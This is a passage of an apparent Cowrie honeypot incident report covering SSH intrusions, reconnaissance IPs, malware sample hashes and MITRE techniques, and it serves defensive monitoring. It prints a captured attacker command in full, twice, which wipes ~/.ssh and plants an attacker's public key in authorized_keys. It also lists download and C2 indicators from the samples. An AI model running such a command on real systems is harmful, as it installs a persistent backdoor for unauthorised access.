| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:52:08` | `cowrie.session.connect` |
| `2026-07-05 06:52:08` | `cowrie.client.version` |
| `2026-07-05 06:52:08` | `cowrie.client.kex` |
| `2026-07-05 06:52:09` | `cowrie.login.success` |
| `2026-07-05 06:52:10` | `cowrie.session.params` |
| `2026-07-05 06:52:10` | `cowrie.command.input` |
| `2026-07-05 06:52:10` | `cowrie.command.failed` |
| `2026-07-05 06:52:10` | `cowrie.log.closed` |
| `2026-07-05 06:52:11` | `cowrie.session.params` |
| `2026-07-05 06:52:11` | `cowrie.command.input` |
| `2026-07-05 06:52:11` | `cowrie.session.file_download` |
| `2026-07-05 06:52:11` | `cowrie.log.closed` |
| `2026-07-05 06:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.3[.]128` to AbuseIPDB if not already reported
- [ ] Block `217.60.3[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4a6a9ad7c0e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.3[.]128` |
| **First Seen** | 2026-07-05 06:52 |
| **Last Seen** | 2026-07-05 06:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:52:11` | `cowrie.session.connect` |
| `2026-07-05 06:52:11` | `cowrie.client.version` |
| `2026-07-05 06:52:11` | `cowrie.client.kex` |
| `2026-07-05 06:52:11` | `cowrie.login.success` |
| `2026-07-05 06:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.3[.]128` to AbuseIPDB if not already reported
- [ ] Block `217.60.3[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9449695421f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.3[.]128` |
| **First Seen** | 2026-07-05 06:52 |
| **Last Seen** | 2026-07-05 06:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:52:12` | `cowrie.session.connect` |
| `2026-07-05 06:52:12` | `cowrie.client.version` |
| `2026-07-05 06:52:12` | `cowrie.client.kex` |
| `2026-07-05 06:52:12` | `cowrie.login.success` |
| `2026-07-05 06:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.3[.]128` to AbuseIPDB if not already reported
- [ ] Block `217.60.3[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349b3f5ec85c

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-07-05 06:54 |
| **Last Seen** | 2026-07-05 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:54:10` | `cowrie.session.connect` |
| `2026-07-05 06:54:10` | `cowrie.client.version` |
| `2026-07-05 06:54:10` | `cowrie.client.kex` |
| `2026-07-05 06:54:10` | `cowrie.login.success` |
| `2026-07-05 06:54:10` | `cowrie.session.params` |
| `2026-07-05 06:54:10` | `cowrie.command.input` |
| `2026-07-05 06:54:10` | `cowrie.command.failed` |
| `2026-07-05 06:54:10` | `cowrie.log.closed` |
| `2026-07-05 06:54:11` | `cowrie.session.params` |
| `2026-07-05 06:54:11` | `cowrie.command.input` |
| `2026-07-05 06:54:11` | `cowrie.session.file_download` |
| `2026-07-05 06:54:11` | `cowrie.log.closed` |
| `2026-07-05 06:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceaa8d023ac0

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-07-05 06:54 |
| **Last Seen** | 2026-07-05 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:54:11` | `cowrie.session.connect` |
| `2026-07-05 06:54:11` | `cowrie.client.version` |
| `2026-07-05 06:54:11` | `cowrie.client.kex` |
| `2026-07-05 06:54:11` | `cowrie.login.success` |
| `2026-07-05 06:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12780baba273

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-07-05 06:54 |
| **Last Seen** | 2026-07-05 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:54:11` | `cowrie.session.connect` |
| `2026-07-05 06:54:11` | `cowrie.client.version` |
| `2026-07-05 06:54:11` | `cowrie.client.kex` |
| `2026-07-05 06:54:11` | `cowrie.login.success` |
| `2026-07-05 06:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5f8827d238

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:54 |
| **Last Seen** | 2026-07-05 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:54:56` | `cowrie.session.connect` |
| `2026-07-05 06:54:57` | `cowrie.client.version` |
| `2026-07-05 06:54:57` | `cowrie.client.kex` |
| `2026-07-05 06:55:03` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.81.2[.]201` | **277** | 2026-07-05 02:55 | 2026-07-05 06:54 | 158m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **80** | 2026-07-05 03:04 | 2026-07-05 06:51 | 52m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.243[.]38` | **60** | 2026-07-05 04:42 | 2026-07-05 05:19 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.73[.]73` | **30** | 2026-07-05 06:10 | 2026-07-05 06:11 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **9** | 2026-07-05 03:09 | 2026-07-05 06:11 | 10m | 0 | `T1592` | 🟢 LOW |
| `64.89.162[.]15` | **5** | 2026-07-05 05:06 | 2026-07-05 06:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | **4** | 2026-07-05 03:41 | 2026-07-05 05:38 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **4** | 2026-07-05 03:56 | 2026-07-05 04:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]106` | **4** | 2026-07-05 03:40 | 2026-07-05 03:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **3** | 2026-07-05 04:58 | 2026-07-05 05:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | **3** | 2026-07-05 06:35 | 2026-07-05 06:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | **3** | 2026-07-05 05:15 | 2026-07-05 05:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]192` | **3** | 2026-07-05 05:14 | 2026-07-05 05:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]97` | **3** | 2026-07-05 06:29 | 2026-07-05 06:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]172` | **3** | 2026-07-05 06:29 | 2026-07-05 06:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]179` | **3** | 2026-07-05 05:15 | 2026-07-05 05:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **3** | 2026-07-05 03:02 | 2026-07-05 03:37 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-05 04:42 | 2026-07-05 04:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-07-05 04:58 | 2026-07-05 05:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.203.52[.]86` | **2** | 2026-07-05 06:40 | 2026-07-05 06:42 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-07-05 06:15 | 2026-07-05 06:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-05 06:48 | 2026-07-05 06:53 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.96.192[.]88` | 1 | 2026-07-05 04:03 | 2026-07-05 04:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.190[.]191` | 1 | 2026-07-05 04:34 | 2026-07-05 04:35 | 91s | 0 | `T1592` | 🟢 LOW |
| `106.74.128[.]226` | 1 | 2026-07-05 04:39 | 2026-07-05 04:39 | 1s | 0 | `T1592` | 🟢 LOW |
| `112.53.123[.]177` | 1 | 2026-07-05 03:34 | 2026-07-05 03:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.149.196[.]217` | 1 | 2026-07-05 04:00 | 2026-07-05 04:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]166` | 1 | 2026-07-05 03:34 | 2026-07-05 03:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]215` | 1 | 2026-07-05 03:20 | 2026-07-05 03:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]169` | 1 | 2026-07-05 03:26 | 2026-07-05 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.77[.]176` | 1 | 2026-07-05 03:19 | 2026-07-05 03:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.31.210[.]125` | 1 | 2026-07-05 05:38 | 2026-07-05 05:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]199` | 1 | 2026-07-05 03:34 | 2026-07-05 03:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]159` | 1 | 2026-07-05 03:49 | 2026-07-05 03:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.121[.]146` | 1 | 2026-07-05 04:34 | 2026-07-05 04:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]199` | 1 | 2026-07-05 06:42 | 2026-07-05 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.91[.]55` | 1 | 2026-07-05 03:26 | 2026-07-05 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.65.84[.]96` | 1 | 2026-07-05 04:52 | 2026-07-05 04:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]48` | 1 | 2026-07-05 03:57 | 2026-07-05 03:57 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]245` | 1 | 2026-07-05 04:59 | 2026-07-05 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.26.0[.]248` | 1 | 2026-07-05 04:05 | 2026-07-05 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.142.255[.]221` | 1 | 2026-07-05 05:30 | 2026-07-05 05:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-07-05 03:55 | 2026-07-05 03:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-07-05 06:15 | 2026-07-05 06:16 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-05 04:36 | 2026-07-05 04:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]138` | 1 | 2026-07-05 03:57 | 2026-07-05 03:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]152` | 1 | 2026-07-05 03:58 | 2026-07-05 03:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]193` | 1 | 2026-07-05 04:59 | 2026-07-05 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-07-05 05:20 | 2026-07-05 05:20 | 1s | 0 | `T1592` | 🟢 LOW |
| `78.186.247[.]118` | 1 | 2026-07-05 05:31 | 2026-07-05 05:32 | 33s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-07-05 06:20 | 2026-07-05 06:20 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `69.5.169[.]193` | DE | Infrawatch Limited | **100** ⚠️ | 43 |
| `106.13.183[.]241` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 32 |
| `107.175.156[.]152` | US | HostPapa | **100** ⚠️ | 22 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `207.175.73[.]73` | BE | Google LLC | **100** ⚠️ | 0 |
| `106.13.190[.]191` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 15 |
| `217.60.3[.]128` | LV | CGI GLOBAL LIMITED | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 361 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 345 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 182 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (120 filtered)

| Reason | Count |
|---|---|
